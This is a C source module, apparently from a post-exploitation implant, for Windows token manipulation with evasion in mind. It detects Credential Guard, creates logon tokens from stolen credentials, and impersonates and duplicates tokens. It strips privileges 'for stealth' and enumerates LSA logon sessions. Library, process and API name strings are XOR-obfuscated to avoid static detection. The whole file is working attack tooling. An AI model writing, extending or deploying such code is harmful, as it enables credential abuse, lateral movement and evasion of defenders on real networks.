/*
 * token_evasion.c — OPSEC-aware token manipulation.
 */
#include "agent.h"
#include "token_evasion.h"
#include "api_resolve.h"
#include <tlhelp32.h>

/* ─── Dangerous privilege names (to strip for stealth) ─── */
const wchar_t *PRIVS_DANGEROUS[] = {
    L"SeDebugPrivilege",
    L"SeTcbPrivilege",
    L"SeAssignPrimaryTokenPrivilege",
    L"SeLoadDriverPrivilege",
    L"SeBackupPrivilege",
    L"SeRestorePrivilege",
    L"SeTakeOwnershipPrivilege",
    L"SeCreateTokenPrivilege",
    L"SeImpersonatePrivilege",
    L"SeEnableDelegationPrivilege",
    NULL
};

const wchar_t *PRIVS_MINIMAL[] = {
    L"SeChangeNotifyPrivilege",
    L"SeIncreaseWorkingSetPrivilege",
    NULL
};

/* ═══════════════════════════════════════════════════════════════════
 *  Credential Guard detection
 * ═══════════════════════════════════════════════════════════════════ */

BOOL token_credential_guard_active(void) {
    /*
     * Method 1: Check for LsaIso.exe process (Credential Guard isolates
     * secrets in a secure VM; LsaIso.exe is the isolated LSA process).
     */
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnap, &pe)) {
            do {
                /* XOR-decrypt "lsaiso.exe" on stack */
                wchar_t _lsa[] = {L'l'^0x5A, L's'^0x5A, L'a'^0x5A, L'i'^0x5A,
                                  L's'^0x5A, L'o'^0x5A, L'.'^0x5A, L'e'^0x5A,
                                  L'x'^0x5A, L'e'^0x5A, 0};
                for (int _i = 0; _lsa[_i]; _i++) _lsa[_i] ^= 0x5A;
                BOOL _match = (_wcsicmp(pe.szExeFile, _lsa) == 0);
                SecureZeroMemory(_lsa, sizeof(_lsa));
                if (_match) {
                    CloseHandle(hSnap);
                    return TRUE;
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    /*
     * Method 2: Check registry key.
     * HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard
     *   EnableVirtualizationBasedSecurity = 1
     * HKLM\SYSTEM\CurrentControlSet\Control\Lsa
     *   LsaCfgFlags = 1 or 2
     */
    HKEY hKey;
    LONG ret = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
        0, KEY_READ, &hKey);

    if (ret == ERROR_SUCCESS) {
        DWORD val = 0;
        DWORD size = sizeof(val);
        ret = RegQueryValueExW(hKey, L"LsaCfgFlags", NULL, NULL,
                                (LPBYTE)&val, &size);
        RegCloseKey(hKey);
        if (ret == ERROR_SUCCESS && val > 0) {
            return TRUE;
        }
    }

    return FALSE;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Token creation (make_token)
 * ═══════════════════════════════════════════════════════════════════ */

HANDLE token_make_token(
    const wchar_t *domain,
    const wchar_t *username,
    const wchar_t *password,
    SAFE_LOGON_TYPE logonType)
{
    if (!username || !password) return INVALID_HANDLE_VALUE;

    DWORD winLogonType;

    switch (logonType) {
        case LOGON_TYPE_INTERACTIVE:
            winLogonType = LOGON32_LOGON_INTERACTIVE;  /* Type 2 */
            break;
        case LOGON_TYPE_NETWORK:
            winLogonType = LOGON32_LOGON_NETWORK;      /* Type 3 */
            break;
        case LOGON_TYPE_NEW_CREDS:
            winLogonType = LOGON32_LOGON_NEW_CREDENTIALS; /* Type 9 */
            break;
        case LOGON_TYPE_SERVICE:
            winLogonType = LOGON32_LOGON_SERVICE;      /* Type 5 */
            break;
        case LOGON_TYPE_AUTO:
        default:
            /*
             * Auto-select: use NEW_CREDENTIALS (type 9) by default.
             * Safest for post-ex: keeps local token, only uses creds
             * for network access. Doesn't validate password locally.
             */
            winLogonType = LOGON32_LOGON_NEW_CREDENTIALS;
            break;
    }

    HANDLE hToken = INVALID_HANDLE_VALUE;
    BOOL ok = LogonUserW(
        username,
        domain ? domain : L".",
        password,
        winLogonType,
        LOGON32_PROVIDER_DEFAULT,
        &hToken
    );

    if (!ok) {
        /* If NEW_CREDENTIALS fails (shouldn't normally), fall back to NETWORK */
        if (winLogonType == LOGON32_LOGON_NEW_CREDENTIALS) {
            ok = LogonUserW(
                username,
                domain ? domain : L".",
                password,
                LOGON32_LOGON_NETWORK,
                LOGON32_PROVIDER_DEFAULT,
                &hToken
            );
        }
    }

    return ok ? hToken : INVALID_HANDLE_VALUE;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Privilege stripping
 * ═══════════════════════════════════════════════════════════════════ */

int token_strip_privileges(HANDLE hToken, const wchar_t **privNames) {
    if (!hToken || hToken == INVALID_HANDLE_VALUE || !privNames)
        return 0;

    int stripped = 0;

    for (int i = 0; privNames[i] != NULL; i++) {
        LUID luid;
        if (!LookupPrivilegeValueW(NULL, privNames[i], &luid))
            continue;

        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;

        if (AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL)) {
            if (GetLastError() != ERROR_NOT_ALL_ASSIGNED)
                stripped++;
        }
    }

    return stripped;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Token impersonation
 * ═══════════════════════════════════════════════════════════════════ */

BOOL token_impersonate(HANDLE hToken, const PRIV_FILTER *filter) {
    if (!hToken || hToken == INVALID_HANDLE_VALUE)
        return FALSE;

    /* Duplicate to impersonation token if it's a primary token */
    HANDLE hImpToken = INVALID_HANDLE_VALUE;
    DWORD tokenType = 0;
    DWORD retLen = 0;
    GetTokenInformation(hToken, TokenType, &tokenType, sizeof(tokenType), &retLen);

    if (tokenType == TokenPrimary) {
        /* Need to duplicate as impersonation token */
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                               SecurityImpersonation, TokenImpersonation, &hImpToken))
        {
            return FALSE;
        }
    } else {
        /* Already an impersonation token — duplicate to get our own handle */
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                               SecurityImpersonation, TokenImpersonation, &hImpToken))
        {
            return FALSE;
        }
    }

    /* Apply privilege filter if specified */
    if (filter) {
        if (filter->stripAll) {
            /* Remove ALL privileges — nuclear option */
            AdjustTokenPrivileges(hImpToken, TRUE, NULL, 0, NULL, NULL);
        } else if (filter->keep) {
            /*
             * Strategy: enumerate all privileges, remove those NOT in the
             * keep list. This is the inverse approach — keep only what's needed.
             */
            DWORD privBufLen = 0;
            GetTokenInformation(hImpToken, TokenPrivileges, NULL, 0, &privBufLen);
            if (privBufLen > 0) {
                TOKEN_PRIVILEGES *privs = (TOKEN_PRIVILEGES *)HeapAlloc(
                    GetProcessHeap(), 0, privBufLen);
                if (privs && GetTokenInformation(hImpToken, TokenPrivileges,
                                                  privs, privBufLen, &privBufLen))
                {
                    for (DWORD i = 0; i < privs->PrivilegeCount; i++) {
                        wchar_t privName[128];
                        DWORD nameLen = 128;
                        if (LookupPrivilegeNameW(NULL, &privs->Privileges[i].Luid,
                                                  privName, &nameLen))
                        {
                            /* Check if this privilege is in the keep list */
                            BOOL keep = FALSE;
                            for (int k = 0; filter->keep[k] != NULL; k++) {
                                if (_wcsicmp(privName, filter->keep[k]) == 0) {
                                    keep = TRUE;
                                    break;
                                }
                            }
                            if (!keep) {
                                /* Remove this privilege */
                                TOKEN_PRIVILEGES tp;
                                tp.PrivilegeCount = 1;
                                tp.Privileges[0].Luid = privs->Privileges[i].Luid;
                                tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
                                AdjustTokenPrivileges(hImpToken, FALSE, &tp, 0, NULL, NULL);
                            }
                        }
                    }
                }
                if (privs) HeapFree(GetProcessHeap(), 0, privs);
            }
        }
    }

    /* Apply impersonation */
    BOOL ok = ImpersonateLoggedOnUser(hImpToken);
    CloseHandle(hImpToken);
    return ok;
}

BOOL token_revert(void) {
    return RevertToSelf();
}

/* ═══════════════════════════════════════════════════════════════════
 *  Token info queries
 * ═══════════════════════════════════════════════════════════════════ */

BOOL token_get_info(HANDLE hToken, TOKEN_INFO *info) {
    if (!hToken || hToken == INVALID_HANDLE_VALUE || !info)
        return FALSE;

    memset(info, 0, sizeof(TOKEN_INFO));

    DWORD retLen;

    /* Username + domain */
    BYTE userBuf[512];
    TOKEN_USER *tokenUser = (TOKEN_USER *)userBuf;
    if (GetTokenInformation(hToken, TokenUser, userBuf, sizeof(userBuf), &retLen)) {
        wchar_t name[128] = {0}, domain[128] = {0};
        DWORD nameLen = 128, domLen = 128;
        SID_NAME_USE snu;
        if (LookupAccountSidW(NULL, tokenUser->User.Sid,
                               name, &nameLen, domain, &domLen, &snu))
        {
            wcsncpy(info->domain, domain, 127);
            _snwprintf(info->username, 255, L"%s\\%s", domain, name);
        }
    }

    /* Token type */
    DWORD tokenType = 0;
    if (GetTokenInformation(hToken, TokenType, &tokenType, sizeof(tokenType), &retLen)) {
        info->tokenType = tokenType;
        info->isImpersonating = (tokenType == TokenImpersonation);
    }

    /* Impersonation level (only valid for impersonation tokens) */
    if (info->isImpersonating) {
        DWORD impLevel = 0;
        if (GetTokenInformation(hToken, TokenImpersonationLevel,
                                 &impLevel, sizeof(impLevel), &retLen))
        {
            info->impersonationLevel = impLevel;
        }
    }

    /* Elevation */
    TOKEN_ELEVATION elev = {0};
    if (GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &retLen)) {
        info->isElevated = elev.TokenIsElevated;
    }

    /* Integrity level */
    BYTE intBuf[256];
    TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)intBuf;
    if (GetTokenInformation(hToken, TokenIntegrityLevel, intBuf, sizeof(intBuf), &retLen)) {
        DWORD *subAuth = GetSidSubAuthority(tml->Label.Sid,
            (DWORD)(UCHAR)(*GetSidSubAuthorityCount(tml->Label.Sid) - 1));
        if (subAuth) {
            DWORD rid = *subAuth;
            if (rid >= SECURITY_MANDATORY_SYSTEM_RID)
                info->integrityLevel = 4;  /* SYSTEM */
            else if (rid >= SECURITY_MANDATORY_HIGH_RID)
                info->integrityLevel = 3;  /* HIGH */
            else if (rid >= SECURITY_MANDATORY_MEDIUM_RID)
                info->integrityLevel = 2;  /* MEDIUM */
            else if (rid >= SECURITY_MANDATORY_LOW_RID)
                info->integrityLevel = 1;  /* LOW */
            else
                info->integrityLevel = 0;  /* UNTRUSTED */
        }
    }

    /* Logon session ID */
    TOKEN_STATISTICS stats = {0};
    if (GetTokenInformation(hToken, TokenStatistics, &stats, sizeof(stats), &retLen)) {
        info->logonSessionId = stats.AuthenticationId.LowPart;
    }

    return TRUE;
}

BOOL token_get_current_info(TOKEN_INFO *info) {
    if (!info) return FALSE;

    HANDLE hToken;
    /* Try thread token first (impersonation), then process token */
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            return FALSE;
    }

    BOOL ok = token_get_info(hToken, info);
    CloseHandle(hToken);
    return ok;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Token duplication
 * ═══════════════════════════════════════════════════════════════════ */

HANDLE token_duplicate(HANDLE hToken, DWORD impLevel) {
    if (!hToken || hToken == INVALID_HANDLE_VALUE)
        return INVALID_HANDLE_VALUE;

    HANDLE hDup = INVALID_HANDLE_VALUE;

    SECURITY_IMPERSONATION_LEVEL secLevel;
    switch (impLevel) {
        case 0: secLevel = SecurityAnonymous; break;
        case 1: secLevel = SecurityIdentification; break;
        case 2: secLevel = SecurityImpersonation; break;
        case 3: secLevel = SecurityDelegation; break;
        default: secLevel = SecurityImpersonation; break;
    }

    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                           secLevel, TokenImpersonation, &hDup))
    {
        return INVALID_HANDLE_VALUE;
    }

    return hDup;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Session enumeration (requires SYSTEM)
 * ═══════════════════════════════════════════════════════════════════ */

/* LsaEnumerateLogonSessions / LsaGetLogonSessionData typedefs */
typedef NTSTATUS (WINAPI *pfnLsaEnumerateLogonSessions)(
    PULONG LogonSessionCount,
    PLUID *LogonSessionList
);
typedef NTSTATUS (WINAPI *pfnLsaFreeReturnBuffer)(PVOID Buffer);

int token_enumerate_sessions(TOKEN_ENUM_CALLBACK callback, void *ctx) {
    if (!callback) return 0;

    char _ss[] = {'s'^0x5A,'e'^0x5A,'c'^0x5A,'u'^0x5A,'r'^0x5A,'3'^0x5A,'2'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
    for(int _i=0;_ss[_i];_i++) _ss[_i]^=0x5A;
    HMODULE hSecur32 = LoadLibraryA(_ss);
    SecureZeroMemory(_ss, sizeof(_ss));
    if (!hSecur32) return 0;

    char _se[] = {'L'^0x5A,'s'^0x5A,'a'^0x5A,'E'^0x5A,'n'^0x5A,'u'^0x5A,'m'^0x5A,'e'^0x5A,'r'^0x5A,'a'^0x5A,'t'^0x5A,'e'^0x5A,'L'^0x5A,'o'^0x5A,'g'^0x5A,'o'^0x5A,'n'^0x5A,'S'^0x5A,'e'^0x5A,'s'^0x5A,'s'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A,'s'^0x5A,0};
    for(int _i=0;_se[_i];_i++) _se[_i]^=0x5A;
    pfnLsaEnumerateLogonSessions pEnum =
        (pfnLsaEnumerateLogonSessions)GetProcAddress(hSecur32, _se);
    SecureZeroMemory(_se, sizeof(_se));

    char _sf[] = {'L'^0x5A,'s'^0x5A,'a'^0x5A,'F'^0x5A,'r'^0x5A,'e'^0x5A,'e'^0x5A,'R'^0x5A,'e'^0x5A,'t'^0x5A,'u'^0x5A,'r'^0x5A,'n'^0x5A,'B'^0x5A,'u'^0x5A,'f'^0x5A,'f'^0x5A,'e'^0x5A,'r'^0x5A,0};
    for(int _i=0;_sf[_i];_i++) _sf[_i]^=0x5A;
    pfnLsaFreeReturnBuffer pFree =
        (pfnLsaFreeReturnBuffer)GetProcAddress(hSecur32, _sf);
    SecureZeroMemory(_sf, sizeof(_sf));

    if (!pEnum || !pFree) return 0;

    ULONG sessionCount = 0;
    PLUID sessionList = NULL;
    NTSTATUS status = pEnum(&sessionCount, &sessionList);
    if (status != 0 || !sessionList) return 0;

    int enumerated = 0;
    for (ULONG i = 0; i < sessionCount; i++) {
        TOKEN_INFO info = {0};
        info.logonSessionId = sessionList[i].LowPart;

        /* Pass session LUID to callback; callback can query further */
        if (!callback(sessionList[i], &info, ctx))
            break;  /* Callback returned FALSE = stop */

        enumerated++;
    }

    pFree(sessionList);
    return enumerated;
}
